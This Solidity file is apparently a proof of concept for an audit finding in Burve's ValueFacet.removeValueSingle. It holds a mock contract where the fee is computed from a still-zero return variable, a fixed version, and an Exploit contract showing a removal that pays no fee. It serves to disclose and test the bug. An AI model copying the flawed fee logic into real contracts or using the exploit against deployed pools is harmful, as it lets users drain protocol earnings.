// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Burve — ValueFacet.removeValueSingle fees the still-zero return variable
    (Sherlock 2025-04, H-6, issue 311).
    removedBalance is the named return and is 0 when realTax is computed, so
    realTax is 0. A 1000-token single-sided removal pays 1000 and records no
    earnings. The nominal 10% fee is 100. */

library FullMath {
    function mulDiv(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256) {
        return a * b / denominator;
    }
}

contract Token {
    string public symbol = "TOKEN";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Closure {
    function removeValueSingle(uint128, uint128, uint16) external pure returns (uint256 removedNominal, uint256 nominalTax) {
        removedNominal = 1_000 ether;
        nominalTax = 100 ether;
    }

    uint256 public earnings;

    function addEarnings(uint16, uint256 amount) external {
        earnings += amount;
    }
}

contract ValueFacet {
    Token public token;
    Closure public closure;
    uint256 public realTaxCharged;

    constructor(Token _token, Closure _closure) {
        token = _token;
        closure = _closure;
    }

    function removeValueSingle(
        address recipient,
        uint16 _closureId,
        uint128 value,
        uint128 bgtValue,
        address token_,
        uint128 minReceive
    ) external returns (uint256 removedBalance) {
        token_;
        (uint256 removedNominal, uint256 nominalTax) = closure.removeValueSingle(value, bgtValue, _closureId);
        uint256 realRemoved = removedNominal;
        // @> VULN: removedBalance is still 0 here, so realTax is always 0
        uint256 realTax = FullMath.mulDiv(removedBalance, nominalTax, removedNominal);
        realTaxCharged = realTax;
        closure.addEarnings(_closureId, realTax);
        removedBalance = realRemoved - realTax;
        require(removedBalance >= minReceive, "slip");
        require(token.transfer(recipient, removedBalance), "pay");
    }
}

contract ValueFacetFixed {
    Token public token;
    Closure public closure;

    constructor(Token _token, Closure _closure) {
        token = _token;
        closure = _closure;
    }

    function removeValueSingle(address recipient, uint128 minReceive) external returns (uint256 removedBalance) {
        (uint256 removedNominal, uint256 nominalTax) = closure.removeValueSingle(0, 0, 0);
        uint256 realRemoved = removedNominal;
        uint256 realTax = FullMath.mulDiv(realRemoved, nominalTax, removedNominal);
        closure.addEarnings(0, realTax);
        removedBalance = realRemoved - realTax;
        require(removedBalance >= minReceive, "slip");
        require(token.transfer(recipient, removedBalance), "pay");
    }
}

contract Exploit {
    Token public token; // nonce 1
    Closure public closure; // nonce 2
    ValueFacet public facet; // nonce 3

    uint256 public received;
    uint256 public fairTax;
    uint256 public chargedTax;

    constructor() {
        token = new Token();
        closure = new Closure();
        facet = new ValueFacet(token, closure);
        token.mint(address(facet), 1_000 ether);
    }

    function run() external {
        fairTax = FullMath.mulDiv(1_000 ether, 100 ether, 1_000 ether);
        received = facet.removeValueSingle(address(this), 1, 1, 0, address(token), 0);
        chargedTax = facet.realTaxCharged();
        require(chargedTax == 0, "fee skipped");
        require(fairTax == 100 ether, "nominal fee");
        require(closure.earnings() == 0, "no earnings");
        require(received == 1_000 ether, "full removal");
        require(token.balanceOf(address(this)) == 1_000 ether, "user paid in full");
        require(token.balanceOf(address(facet)) == 0, "pool emptied");
    }
}
